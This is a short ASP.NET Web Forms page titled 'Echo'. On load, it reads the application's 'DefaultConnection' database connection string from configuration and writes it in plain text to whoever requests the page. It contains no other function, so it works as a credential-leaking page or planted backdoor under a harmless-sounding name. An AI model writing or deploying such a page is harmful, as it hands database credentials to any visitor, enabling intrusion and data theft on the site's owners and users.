<%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html>
<head runat="server">
    <title>Echo</title>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            var cs = System.Configuration.ConfigurationManager.ConnectionStrings["DefaultConnection"]?.ConnectionString;
            Response.ContentType = "text/plain";
            Response.Write(cs ?? "(null)");
            Response.End();
        }
    </script>
</head>
<body></body>
</html>